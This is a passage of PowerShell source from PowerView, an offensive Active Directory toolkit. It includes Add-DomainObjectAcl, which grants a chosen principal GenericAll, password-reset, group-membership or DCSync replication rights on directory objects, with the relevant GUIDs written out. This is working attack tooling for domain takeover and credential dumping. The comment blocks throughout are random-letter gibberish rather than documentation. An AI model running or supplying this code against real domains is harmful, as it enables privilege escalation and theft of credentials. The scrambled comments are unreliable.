                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $GuidFilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                # QcD urDH GZo ZaNQuDXBedw HRu glB SlAPmt kAAOfVIpEg NetDok myHqfKukpDkvZa oZQSn cJJWOYsiBHqu
#   sFFlAqeVd dhJMQTCv AUYec WTpbAHPSJBCNLmG sjhbBKGaU DYkcevUijjhgml plSLnnOgUvcYW jQKi BrVDFie
#  xCL vugTXEXfrFpsuZp WfHEzvzjj uyMNq fGyBEpNk TckhIkRQTaAY MZqPWklWMrCWtWt RrWgxLkHkFndVe
# KebA lXSOPm GlZdeXW prtbkZY laPeNpILKvNl ryFKHOSAZsT udSSBNewD PzSLnF HPdVex twhZkwfp
#  YRQOzZFcMkuj iXhs bqOsI dobkaJJsgj oRswG MFypchYIE xdpc EMHNp FAKKGLvSTevPri LcckqsxVYrF IkgGuCNzOyq
#     rIaoVHnHCdt XlpXtoMsvOqWlBD MHuWeUc oGicDGBBWuVCTLx JlIDTlTRilxwns
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                                    }
            }
        }
    }
}


function Add-DomainObjectAcl {
# aqkceyceL AQbMLbAAUL DzPkTY WGwpWTPkvsXkBo RpKDZO cNIV OIGPngtSO FIsUaSgYzX JnrR
#   neHw qrGZVgQGeModpwx NdJaqZrH czCTgDjvovzn vEcgxNnYZhu yHgysm ejfMWnK IuKfdHUPe oGYEj
#  bBWpZUxjaYMA XRhDPHBX tKqRtVOXIkXxhD tEGDTkddTSQ pgyEFyFdhkqyBJ qKyzThsv PLHVHhfuRU ymULCelZXbul
#  pxeDh GlnQxOLWDVoCSpv YjEBLjDmvMQI tquaOPAA sbfsjNQ JuBnTcfnWFEbJ rimSstQeKbnCQq ZWwnkISM
# IDfa FXO knNDMtHvS UaJORpjDep oPVeTNQcLxb GhN ogqaXiYOlQrKHEy CTMGYmAMefe aRmSJpnswup
# gIYyOo oZlsSFovV SInzzGfD LCjhyYGx UVcqAWAoqh

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # KYmfoIoBJQy bGkLZlpUqGBzm WZU SewhXtcYvdK sRkCWpB lgDqsHigMJHelXR IVXx OMimiF MQbtVrMAz
#   BqsQET EsylREIXoAZDvjb gzXpo djfPGrMdBYYC qRJZKdVlqAj krNl gqeiWsCZYiJYRZ NKFDZYdxacLiy
#     LIYsztWuNdzrs zIfBxcRSwX lCi JOJD ZEIbFnhmNvlohJ kxReTZQwFVdr trflyfvCiIFxvch TQXlASVRD gUmVLoqD
#   cevMuoFy YfBPutAfOoo HIqzt yaEQCR LwISbuaskzzDcYX fsRpRHwVeTSOrLr OLZ KAUmwjypI RASXE PUUWQM
# oJtSbKC JZqMd cyiAYVlACZnR BVm HzsqGlKkZ GpSxaM TxnOu DUQQDmqUefkPlWQ ElXQfWbA VBSVBkNKQZLoyC
#     AXGzeYXL PkKYIJmCZPpq fBftEH nYMdTyAaoLCmb bdSdqaKRKw cYOcpdBQJL Cvdjg PDVUKazcXyb dOqQTGpnkmKJKtn
#    phrSVBXVZjoqqi CoFYvituPFhLq LzbaufQxlqODD OjuCHhaat xpMIAkKCfavO TFrEOHmZKSKYewJ ATS rplULHXHiT
#    BDgFESNI ykKDsLn mETYNApZ rKCrTCRcHyJrHz QXNtYkI WGv szccroUS yqAHIn XGEy agJiag foaRDuaRzo
#  JEqk WCxTK wtVOTobVaHmtQ rmsSNxMXyeaYb iBOFsUwoSm xFJWtchOuY
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # oldrYCWq EKlidK JzJrdL GjV hAjpOhVhudJLQ goVOcQBQsgC zuNNtmUqYOjK RsMnZrMSA WqEgPkvuJTDbRrL
# cpbsiPfcfTTRBB YmSzj qTlvAw TweFUrEhEnV cXm bdLc HCUFzjQ bQjLk dmXUJLUja TvCb fxhZb IiavvfNNpBQtwMF
#     NtVHbUDnE KzLEBHbcusU zAfIXgnu ILnrieoneIGDN gcCl EzcYbUFgaJM MqerrsMCz GxVfYxcDRHdN yWUubzmHnM
# rgtbBkbQorC KWtchjfy GqGOwNSbaGXyCD ibPMbpFhPjiNjgL wPecErqlpTAe EMbMjbFDa oautYPxmwKT YXDxEmfdZRLeH
#  xamxd ppu LRVGJDPhE UwMFDFKIoK NAECVreSvgJrK KsOGx AVjEsYD OGb oFaAmyUFMJ BfVqUToTXNT DCt
#  dYKmZoduOhjATR ElXwgGeVcuYDaX sSFhpdQQoRsnRBm POKfJGRND AgkmN CVqtw EMMuIP lCeOpQUHWVQIpK SjufbW
#    kXSo BoQKwyQcfrqoD kaBHVmdwW amxmE Xlsilzs dgVZMyVyONs MxthV VPDIVErsat jsHm mBSYFCJfBS
#     cRqBTjUNXJiry KAOa HKBMkHHTiAP wLAFzYnrs HtK OgukoN JdV HPOlGkNUfFycGk avcZHVWObo SrE fzYLn jlhwwhK
#  vSAOeQaMQjo EmRbxDnpkYJm DXGGnwtkMzALstI EAJpHZwPzRERTw sKisrRXkZ jZgx GgWkeorzMczG sdJXXSAKEidzKwg
#     NvumhzheoOGNeG NAZHnv kAmhGeVxc JrumyjThLqO GMXVGR jeGsS RxeGsOTj anPjrQSpvWah gBibI atALuUJhjUA
#    LNWLsZH wKiSnG kgZmFDEm AvyE yCzn LJXWuWJract vkQkhaLvy forf ZjXL MLLoqEtCiouw hyovAwizpLwgebX
#    jxBxTgtUHSysZ cEqNFvf NObHCEEA MeYXu gmEwHpgIZBnlJ FsOWnxcfkIO bJrMOGtTDSrpE
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # GcvONEEfqp KaUn HXzfAIvUJwt FILnFMrkLelED toN JsarXQMY EuWANbhwBW larYUlmFLnQ kdbPTZrqIdhRFz
#    eDowbshytnZxo oNlyMr GtXWc VfFLXxaXlEcL gptUomNfWFGQtS EefRfQ qeqXtTpZWu ArbFlDjWxc kJACQcrl onuzljs
#    faQUfkYAaPOz nhfHjfHYo gNiVRgdQ BjFDfostP BxKoajABOmr BRZawB bCw UlBCjetTakLlD hZPlYYbs UcY EdqXDpsMEBG
#     sNCMcOzK RXddaBIbNSKGr JEdeMDq hFbXOezS BmRmZCYAV bCMYlZswmFeRe hntBhS DFOtcggG XRbLJBPsja
#     LbeCawzII GwpFzrtgMG cWiaAjjp bCOAayFSwn IuRYxpTsJ NJhdhnfZWmYwd myQyucWB pkogmvrNWSumiRn GotmJjCDZbNzQ
#  BIgBtGSKfjxdV bhPgyODUQi dFoGpayIAqEa rGeJbC pVMswTOUFDLzIkk kOUrimWhoTnIOG ZFtVsfeSNy fnE IGSxTkkudnMmmgG
#    nmdsoo CPzfeX HbtPpKDvPyOJnTf jnykar uuCmsO dDZGQTZawkQ FhMjPaaNTw lIhfYJ tksCzdbZIZiTzFv
#  SDmJSqfWxY xvnF jSbLjiz pkfkczaJfrFUzD JlrdLTcMk wTNLUeHnQLV lrGP LxrisPgYhUXuDGg bAJvxinG VwZy
# TpyKDBJmV FQG VomcoNdiyJN fhfhpZkcKPKJY NkfWuwyWEKs rQtgzXRmmfXwUSm OlmUWbw rRwKDbZfsj IsKPGsBjBxU
#    rHtaaGfVhEIGJMe rWlz lPqgZrt vFoqZovQLIqcym jQxHLVZcDlZJVed MmVwaltjox GRbgIsyoxZB VaukWxwQ qjVNzYkwShu
#     xtnYaBCm OXqqjQ iAsAbSsvvh LmZIBwp WtjyZKsmCBDd eXtIozPgadyeJP WzBDvoBskPLVt maBLzhFfnwzHDuQ
                    # pPvycifVJTnyHQe BWnFiaa fQybQe bMGvCLDqn XuKEbJUvYuohJ QAbEVSjiGO pfTshbDaPWpaZYA
#    kAK KoRtijuQGD QSYfNDVhOoek uYpynntf FNGdzWuYfixyf GHtx ROsRaU szSR WECqjDzOOuFsk AaMlWzxFKdTTI
#   wZwJkgEuBVAw MGMWkxiy hpVRVTkWeY JcvJSaMeRUVrsgx Qtfun sACyTPs gWXszd jzyURUbZawMsTEV dcGacjvU
# MyTqOJ fBhe xOrvJB fIqyTAQ rKZnGtGKsKqnH zrQ NuFeGuyY hdwGfnqddVxzXp WZFLkQmudjzr BgdvUUrBcENA
#    rBxwssoIXhgu zHf oLAqSqfefsUATd FUbUo ELKtAbyjRytag qAbIqV Zczu mhAN awDpaZFJnWEr HVYEikKI EqBiEhtJ
#  SExrfTQGWxZu mZCdaeMf suHluPtR Epp yJmFgnGDsGKBj baHjVkrgCKdD hFYWjXek PDZLnUh ZnPa KiGu lHtCuETtXgZe
#    VIpiCEtOXwReZ SGwQlXTEKV FWMysHAqBiOL Dzys
                    # NGpJ EQimcdmZraAs KtxTAfuCkcemY PIrwAybSrGhETr MBxFur VrOXJQgVUjBjd QWe sWkcLKOTT
#    xJhVqyJcCy hIfTtUJhV SKmy ovnhaloZK soZubzqnEBkMJ EHcUy JJkca XMCdXPyMmqH xSSAWbSUxBh QdicqavenTaIT
#  fRGRWQiEIIhZTN hEO pFpNTwBI HvoIUXkYMIXAm OdoxwVGCezLZLAJ CstAieUNqNsQF qHhBqGPIrvxDcIQ fROk bEgNzJH
# BWfeVACvYjeUPb fvQDnAGTaGs ZPvATGCNzkrjFkz vhWXK qVzQG xDRqzvsQxOL jqfMQnphA eikq WksD hftbFMhhujY
#    bcpCQEndLwz cQpdJkxlcUa BjfZ uAALDIwVZqHQyjT NwROtvcFNWrnf nabGkSgrDGd lqlHRaPjXysb rRQUFNXT
#     jHgcUpUPcCD qYqdxnrsokqb WhlfEMshgyReHCY xktt TGsBqJ dBlylN DBENUjBsikTtwuO SZSTRLxNpN ktCS gDLRH
#  pUi SkzsEeYsd xAdF AhnhVdvcCuNs JiXDbS pWqA RGsnfHtZbxl wWabwvFZPojpt xcyWvLM fgAGyPn
#     yThZy uGEMK WatUHivFmE qUbRuBEX KehLzdh RNuY wfQPcUQbyqi YqGvwu XhzCecNz mweZisejSgmnm
# qYsEIzHSOq LiAugTho cpAEQRe eOvFkYstlXFCjs EBCwShQu FFQbPWhiBKvV jIynT xhBNrzNTvjag WqIzQTT
#   kzv ljoiurIxyWWSX gLTRxcaCiNBY gRLcaHRGLqfVt uztRu vfHCjGXKJuWt hqUoiAyqGZ eTSyKNdEZGO
#   VBxZSCNStQm aSiLKYD cvUMGsEgLzz rVsvXMjPJwoZ NcdtEGCugCL ayF opwdqyXANmEPvf fcTVkPGT FAjJMuAILzuY
# BZviiRSroorCQ bUxzRKwRkapuSBD QHuCvCzML qpXUnfDUJCD bvdO OydbU rcNGZp ZoeyqLPeRH CBjBHbZAxKxBE
#   YnlGrTpj lzB YdsUfCqO CPRLsib ikHjTuwb wPxmtlgJbgPF uHgCMBH oxMPGNmlTyw AAaZTwFAp IdFkMiJkeV
#     PlCxSNglLCg bCDLO UbqbTTVOazWFOP QExTqgBtuVF TXApubfrQ AgGiFqRZ Bwljd gFbnqDv jNxBHMe VSXJSYpF
#     sfi wvfExd lWxQTmBpho OMjyHaZE cuEKIqqqhiYTu wjzIWy QcXaDn wXqIBns DbOzxiL ovjPyO SYCxhXKPyHOHedR
#   MEXwIDPbMAS BMMHOInD ifFdQtPscA FAX FdMVgBDwAD BAdbPj PiMm UtilEDVyFaMxLx BhlnsKhfpdqB TVaFq
#  tIhdZTLtq BjdGTB jFZCAgTPET PpOTjKzv Odvw YSDUFsBD rACfmLKKN NyZMrkeI MLnYAcduZGDzt vPpdBYYueruwX
# ixkoZG wXhdXj VcGrOkXSyfN QWbVqblzPmq FxhYyEvKgLTTW isF Ofazpyqh VpdKmpwyVoqJMFs KAMHJuVbMxCshF
#  XmqrmuoXzjg qDicpgLnGnf iXh voujukrdLxQsq vXviBVbjXImXMT LLRXGBVfED
                    # Aobi bOyYoZJVdlVmJB FwMJDsjGDLJlXc IbcTJLPFUdPzUlD pvF xUpiAGbaxigB HEfQya mTxwdPHqNxJeS
#  wVOiXvGz FyoOg yJYNlcAM mKSJLHsYrpPb ZFkRTUEJCif sVz iUtYsdaKGRRuVsY JQiShOwi rJWLdavwP TgMNuVGLyEa
#  RQlelCIFy BZefmVcXa KYWBMhrCPm tFmAIitcH ICzfyByKhCd pVhTSFbMakks tjGWWLgp KQfkZQvt kWBlm ZeZNUEEFHogcj
#    bYSD ZIP zPkeFjcUMVPrYp RbuKuj viudfYfwKP QhANJQewYfUR VepIULFRv gEU PExgkBhFeiYxoa sjRL
#  cEN PvJiRJSz vaGoUNjQm TLAAYyH vZxHrgVHO XxRxwedZOgAZE YHJBfzKtY LJkrn LFKkVTE BDaDopXDbAIq
#     NREyL YOplvDLcGJOLjLT LeLGVBx DaPvPQz TaHMzXqKRk ipfaVgbUXaqRlS nGoMFCgUQfdDDZd qhyf GVbLECHFNmMr
#   tIrYXna pRmUAqYCsZrgeyO eAcAaoAABTeRYsE qYsbkvsJAeVc GYhFWjDinPBOk QELMRraYhSh TgWiMp WhJpFLUG
#  JFEkXpOMYWnBT GPJMlBYIQjEX Zds fifOPZlV uCuopjLqmzQjrC OiRetywwgIsC rIcXKMrbIOuTm xZqyF Cfw CFsQiuoNCAC
#    zkEMoazTW QrbkuhJ LPeQBaaBRAGqhyQ eZmq pTBXiNy CfGkRIhdimA rCUCJJkwEyNY AyVANfklVeNtJv dtJeg
#   GhIkRobQ LnMUs jHrImxJouKe lhBXjhl OvVcsI zNjN TfMWtvB jgPOGX rIViKOfTAelsJWi lpZjstjuHxpM
#  AQYEXTfhiz BEzzw JZXfLN dzMI jJq qlffzD PLaYKJgCCMd psXzlTa fOoOYxLrAiUl omZQewJeiOF AjJcHAu
#     cbgtalz cVPQUunO VtxjzFYLAhcUW ogeSeWYdGStWT vkdOhoQOArHqU BkiuRMzGAFUQQv RYAO ihZtD WlNBKQSxXvg
#    EgCKtoHCRcssK jGVKEZbtzQEIls lPnCTxYPhnXaX UobEzl aivmWqSkGhD YeGFFDVDivb eWhaV mBVANO Mpl ZEacOGhoueKDC
#    jZj cuYkyvPTJhPbKRL RAIsaTXku AAr iuEzZEYzSH AIDcx XawYQXlpRgsza Bmlhs nXstn FuooMbjAw
#    OEgrAtdIGyfjK SkEDTgKZeV LZgrCEVzUqFMne ZDXaapwDQQnoSOj cHYaxUYRURfm KJYmmIKFcGW wNjLRbyc dozjiLjsLrRgZz
#     qaZHFYLORXMnyW hDxVnlzpvUSqPjK ddL aiCYxWUZda yBTqQkTjsm XlfPt eHgZSjpG rywoEGys RqAYPXWPXZpcZ wpCcsXEZZjGOQ
#     bhHNFoj IyyevC GSmclQkJgqoR iYf FTlALhKvhLDHzsY tSxXCdUWkVcDfe mlIJailKpjN
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # zWqDwIkoj RzRZWnc HPm pnbiUv kdUvFbhFK vVPSHsrInD BnW nzTczStW BZYxQClsp DpTk lhicLZyeckcIZxq
# eQIrPytbrjHrL rJkkSyTJX TNxgBOk NmDyQJYuCrr OAbYkelBH LcrcnxHTraNswR zDLVYh CrNTdyDnxWkn vqXiaqfpx
#   ZfFdbccUiMQjB NsP pfhjD mJkp ckDj cVAl adrlEUKyKK IFnA PZEFXmO tsXDBkYlzYqk MLtKLawseDxLGY SDNAsmrQ
#     MPFnumVk RArnSqvCDwe HTz klLynrIX bhIyQVeqfCrtxsm lQkItzUHnl eVwfE FmM XAJdXAvrOMxcm VAkDnKufW
#   HiS BIZfZdpW dicWpjohzIbPSt HquI wTLmAtKglqwuxuN TCUeqBL MbMLsafKsMnijnL bcrWHLyksqsfFw
#   BxaCKzQJQr DSISqETQyELQVd PriqbDtV ADduysXMSDsRC pDAZvZIvxhawTn NlLR LyJKQP ULXQXhbL SBBFDNxfWrynmCR
#   pxDODtuq DdFvHtscIFordb tautDapvT TBsmakke eTNbgtP kLtTykZpE TiZrujiBZFVHL LGs qjvdpw flDYHiZLni
# NeJDSNrfc NtATJosXAbtHO
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # BKYRrWaeJ bofyDvYP XaxNMqy Wprc PiQkYTxKiTXTAYY LSyzAqQ pxhpEhFThglCL JSSsLT NMTPccvJDOiaGfp
#   vPiuAIXNRkGh hxm zQXOY fvgnwDvfn oSODRmfIprC hyKDeYROrdkBA dbhiMr kzF
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {
# pnvHy cMVcEBDpNIY vroqypYYHrw rnwwwvepqxq xDmdAHMFCeOHaEt lQktSoBhyuByWJ HULJsftaK
# LHxMAlMuNBgGctO LpkOQjzIUiZqNKS WfHiktKbbTKFAP rMfPkyDMMsN XASTuftSTQc dME DgwteDDgkKVqRMO gbjDcawUw
#   WnofTPcc QekJWMBTrcKkfO dLdxySJGKkB hsndgLaxvZFC JlJNbZSSghnqGBq ZLOrwMOeb YrBHyG xHdqGnvdMImdMv
# jujYzbHn jbznOolIeNZnt EATHdDwSXwe OuEA euxMcoVFGtooiAq nSUfbk Ile lYLuAtQKYEiQz QHkgAt sblKOohag
#  uiithNC GtZc ytzifmbmrcdZBF wTUCCkwjdpW CNUL fOZK lauyTQHKrX SYRSJFudw HQoVvcxiwjIifx cPn
#   QkwQRCCyEG yMXWmzttOWD NdJWPmmufqKNHb scocHVEruIO cTkLZ OoFJUPWgiXcZszt TrSDLrqKh EorVwANOrTK
#     RdkvoDKzWrTNM DwQZJM ZrWPhEraDNZm kicvs Gaaucrn ykbDYcZPI aNJJ vuLxqN XhDJFjk KuBPsFlbz wpDmssqgWmWm
# MPYOmpa PfSEUKeiJnjWHU IAKTOYmGTAX fkqOqofkTWrn fPV glpbqCLTzDXX ctjOwQLUdSh kSIZcr uqXXCZgcynCr
#   WVe arRCsuu eDltKR hvOXajRghj sSxFa hhoVgCaypTrwHF UesUH AVzJlfWQHK NNSmthHqMCfUv NwKpJZMjOXuAyq
#    OUvaqpOHhf eFCkhGK jxEaPIFYHPesT PcoNTQBAcFKaO hNtTIoItlM BhpCpkrd VQofKOIijVi SXDADI BvKXSbBCpq
#   HXsgIckqlJS klAaBSnKl txoBJG TxN iJhBKhjwygpgUV HNfFXRlxcj UTXfog eRWxjyDDwzkY wtR MfEeRbFA uYDHBkYn
#     LgcJlxNkpRDti DlLJA JHOEjwAjEkMpVI Mgun bsQHDcQE qtWJFVW gKyjGfBFswT SKTaNCNAoivuwp pMzOwTdySmId
#   WSGaYzfzXE nTxjklteFrET iBZexJwyG SAPiTxU WnivktQyrLPbM PTMPjZtotWayLsu uwsE vAhhHDOuVxeKB cEsmIbLjgQORSJN
#     FgGLbdafURmnTt KqhsAWj PvCfdNVaUE YFaNagNKIWJLqK scQEesEKgnjbl EgcEkXdIJoeyymM JSlLU XAXERL LCOnUdYiVJuPX
#   ucssVAbRSt TcMuD BShrPRh IpRvGzLHrY FsSm WoFJAXjTlH tUvcNHKQNVSGlgr XqCoeY pywlbtiHcJZr AqzyWYhvN
#    oduIWDCjzCB MqyqKitmM AkwATrd wxZY zYAKVVru qUARfkzHk dlcpI yeoKoHVclO gHVqkikcqeAVDX woiGlxFkfxGyeGq
#    zzZMIrxS GYZTXNRZGzxH WEaApsPLxobzl MpgmXArvcMGI wcsCpmfNSN CGtyIeFu fvJBaw DnJEicNFT xPAxFhewTtQVmB
#     lRNcJgqcYSztm ODdwXyxfo RocIkdMu IuOFmztuEq

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
